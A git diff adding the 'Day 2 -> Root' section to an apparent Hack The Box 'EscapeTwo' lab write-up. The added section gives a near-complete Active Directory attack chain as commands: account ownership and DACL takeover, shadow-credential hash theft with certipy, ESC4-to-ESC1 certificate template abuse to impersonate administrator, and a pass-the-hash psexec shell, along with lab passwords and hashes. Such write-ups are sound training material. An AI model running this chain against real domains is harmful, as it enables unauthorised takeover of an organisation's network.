@@ -1,4 +1,4 @@
-# -HTB-EscapeTwo
+<img width="927" height="383" alt="image" src="https://github.com/user-attachments/assets/57f9f98b-f964-4998-bdf7-76a67c2573e9" /># -HTB-EscapeTwo
 
 ### Nmap 
 
@@ -175,6 +175,125 @@ Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
 
 <img width="1656" height="931" alt="image" src="https://github.com/user-attachments/assets/cf4bf2ee-453c-4ed2-8cd5-769cdd133670" />
 
-# Not finish 
+-----
+-----
+----
+
+# Day 2 -> Root 
+
+### I make ryan owner of the ca_svc accoutn 
+
+```
+impacket-owneredit -action write -new-owner ryan -target ca_svc DC01.sequel.htb/ryan:WqSZAF6CysDQbGb3 -dc-ip 10.10.11.51
+```
+
+
+<img width="1014" height="151" alt="image" src="https://github.com/user-attachments/assets/fe03b03a-3fd6-4523-92bb-08bfb249df53" />
+
+
+
+### After i give us full control of ca_svc with decledit
+
+```
+impacket-dacledit -action write -rights FullControl -principal ryan  -target ca_svc DC01.sequel.htb/ryan:WqSZAF6CysDQbGb3
+```
+
+
+<img width="1024" height="107" alt="image" src="https://github.com/user-attachments/assets/ba491fa2-031a-47eb-be20-9fb9455a9814" />
+
+
+
+### And take the hash for ca_svc
+
+```
+certipy-ad shadow auto -u ryan@DC01.sequel.htb -p 'WqSZAF6CysDQbGb3'  -account ca_svc  -dc-ip '10.10.11.51' 
+```
+
+
+<img width="1327" height="468" alt="image" src="https://github.com/user-attachments/assets/497bf726-2f62-45e3-8f7c-319ca8e9ac76" />
+
+
+
+```
+ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce
+```
+
+### I use -vuln cmd with certipy to see if it s vulnerable . And we see it s vulnerable to ESC4
+
+```
+certipy-ad find -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln 
+```
+
+```
+Template Name                       : DunderMifflinAuthentication
+```
+
+<img width="783" height="248" alt="image" src="https://github.com/user-attachments/assets/ed6cbbd6-3bd5-4f94-b65d-fefc569d0e1c" />
+
+
+### We make it vulnerable to ESC1
+
+
+```
+certipy-ad template -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
+```
+
+
+<img width="1392" height="425" alt="image" src="https://github.com/user-attachments/assets/35da27bc-4840-4f3c-ab89-40a8b7c8b91b" />
+
+
+
+### And use certipy to request the UPN for administrator account 
+
+
+```
+certipy-ad req \                                                                                                                                      
+  -u ca_svc@sequel.htb \
+  -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
+  -ca sequel-DC01-CA \
+  -template DunderMifflinAuthentication \
+  -upn administrator@sequel.htb \
+  -dns DC01.sequel.htb \
+  -target DC01.sequel.htb \
+  -target-ip 10.10.11.51
+```
+
+
+<img width="712" height="409" alt="image" src="https://github.com/user-attachments/assets/a3ecf28a-2731-4d27-afb4-0e83ec0bd1a8" />
+
+
+
+### And the hash for the administrator accoutn 
+
+
+```
+certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.10.11.51
+```
+
+
+<img width="927" height="383" alt="image" src="https://github.com/user-attachments/assets/d2be2fa9-b010-44a1-b707-65b413a1e6f9" />
+
+```
+administrator@sequel.htb:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+### Connect to the box with psexec
+
+```
+impacket-psexec -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff administrator@10.10.11.51
+```
+
+<img width="740" height="607" alt="image" src="https://github.com/user-attachments/assets/ea93977b-7852-4784-b023-3d2e36333f09" />
+
+
+
+<img width="398" height="56" alt="image" src="https://github.com/user-attachments/assets/93ccbbf4-4c8f-4d79-a647-0aff1d108e4b" />
+
+
+# If somting fails try to remove the "DunderMifflinAuthentication.json" and re-run the 
+
+```
+certipy-ad template -u 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
+```
 
 
